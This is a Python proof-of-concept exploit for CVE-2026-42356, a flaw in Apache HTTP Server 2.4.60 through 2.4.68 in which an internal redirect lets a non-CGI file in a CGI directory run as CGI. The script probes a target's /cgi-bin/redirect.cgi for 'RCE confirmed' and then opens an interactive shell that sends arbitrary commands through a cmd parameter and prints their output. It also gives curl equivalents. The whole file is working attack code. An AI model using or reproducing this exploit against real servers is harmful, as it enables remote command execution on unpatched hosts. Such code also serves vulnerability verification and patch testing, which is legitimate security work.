#!/usr/bin/env python3
"""
CVE-2026-42356 PoC
Apache HTTP Server 2.4.60 through 2.4.68
Wrong Handler on Internal Redirect to Non-CGI Files in CGI Directories
"""

import argparse
import sys
from urllib.parse import quote

try:
    import requests
except ImportError:
    requests = None


def trigger(target_url):
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    if requests is None:
        print("[-] 'requests' library not installed. Install it or use curl:")
        print(f"      curl -v {target_url.rstrip('/')}/cgi-bin/redirect.cgi")
        return False

    url = f"{target_url.rstrip('/')}/cgi-bin/redirect.cgi"
    print(f"\n[*] GET {url}")

    try:
        resp = requests.get(url, timeout=10, allow_redirects=False)
    except requests.RequestException as e:
        print(f"[-] Connection failed: {e}")
        return False

    print(f"[*] HTTP {resp.status_code}")
    body = resp.text.strip()
    print(f"[*] Body:\n{body}\n")

    if "RCE confirmed" in body:
        print("[!] VULNERABLE: payload executed as CGI via internal redirect.")
        return True

    if resp.status_code == 403:
        print("[*] 403 Forbidden: handler was not inherited. Likely patched (>=2.4.69).")
    elif resp.status_code == 200 and not body:
        print("[*] 200 but empty body: payload served as static file, not executed.")
    else:
        print("[*] Unexpected response. Target may not be vulnerable or setup differs.")

    return False


def execute_cmd(target_url, cmd):
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    if requests is None:
        encoded = quote(cmd)
        print("[-] 'requests' library not installed. Use curl:")
        print(f"      curl -s '{target_url.rstrip('/')}/cgi-bin/redirect.cgi?cmd={encoded}'")
        return None

    url = f"{target_url.rstrip('/')}/cgi-bin/redirect.cgi?cmd={quote(cmd)}"
    try:
        resp = requests.get(url, timeout=10, allow_redirects=False)
    except requests.RequestException as e:
        print(f"[-] Connection failed: {e}")
        return None

    return resp.text


def interactive(target_url):
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    print("\n[*] Verifying target is vulnerable...")
    if not trigger(target_url):
        print("[-] Target does not appear vulnerable. Aborting.")
        return

    print("[*] Interactive shell. Type 'exit' or Ctrl-C to quit.\n")
    while True:
        try:
            cmd = input("shell> ")
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            break
        if cmd.strip().lower() in ("exit", "quit"):
            print("[*] Exiting.")
            break
        if not cmd.strip():
            continue
        output = execute_cmd(target_url, cmd)
        if output is not None:
            print(output, end="" if output.endswith("\n") else "\n")


def main():
    p = argparse.ArgumentParser(
        description="CVE-2026-42356 PoC: Apache HTTPD wrong handler on internal redirect"
    )
    p.add_argument("--target", metavar="URL", default="http://localhost:8080",
                    help="Base URL of the target Apache instance (default: http://localhost:8080)")
    p.add_argument("-i", action="store_true",
                    help="Interactive RCE shell via the exploit chain")

    if len(sys.argv) == 1:
        p.print_help()
        sys.exit(1)

    args = p.parse_args()

    print("=" * 62)
    print(" CVE-2026-42356 PoC")
    print(" Apache HTTPD 2.4.60-2.4.68 | Wrong Handler Internal Redirect")
    print("=" * 62)

    if args.i:
        interactive(args.target)
    else:
        trigger(args.target)


if __name__ == "__main__":
    main()
